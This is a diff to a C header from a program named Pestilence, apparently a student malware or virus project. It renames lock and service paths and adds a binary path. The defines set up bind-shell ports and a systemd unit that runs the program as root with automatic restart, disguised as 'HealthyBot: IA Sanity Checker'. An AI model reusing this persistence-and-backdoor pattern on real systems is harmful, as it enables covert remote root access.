@@ -23,16 +23,18 @@ typedef struct s_service_ctx
 	bool		running;
 }	t_service_ctx;
 
-#define SUPER_USER_LOCK_FILE "/var/lock/Pestilence.lock"
-#define WEAK_LOCK_FILE "/tmp/Pestilence.lock"
+#define SUPER_USER_LOCK_FILE "/var/lock/pestilence.lock"
+#define WEAK_LOCK_FILE "/tmp/pestilence.lock"
 
 #define SUPER_USER_BIND_SHELL_PORT 4242
 #define WEAK_BIND_SHELL_PORT 6967
 
-#define SERVICE_FILE "/etc/systemd/system/Pestilence.service"
-#define SERVICE_START "sudo systemctl start Pestilence.service &"
-#define SERVICE_ENABLE "systemctl enable Pestilence.service &"
-#define SERVICE_RESTART "systemctl restart Pestilence.service &"
+#define BIN_PATH "/bin/pestilence"
+
+#define SERVICE_FILE "/etc/systemd/system/pestilence.service"
+#define SERVICE_START "sudo systemctl start pestilence.service &"
+#define SERVICE_ENABLE "systemctl enable pestilence.service &"
+#define SERVICE_RESTART "systemctl restart pestilence.service &"
 #define SERVICE_FILE_CONTENT "\
 [Unit]\n\
 Description=HealthyBot: IA Sanity Checker (it's real bro i swear...)\n\
@@ -40,11 +42,11 @@ After=network.target\n\
 StartLimitIntervalSec=0\n\
 [Service]\n\
 Type=forking\n\
-PIDFile=/var/lock/Pestilence.lock\n\
+PIDFile=/var/lock/pestilence.lock\n\
 Restart=always\n\
 RestartSec=1\n\
 User=root\n\
-ExecStart=/bin/Pestilence\n\
+ExecStart=/bin/pestilence\n\
 \n\
 [Install]\n\
 WantedBy=multi-user.target"
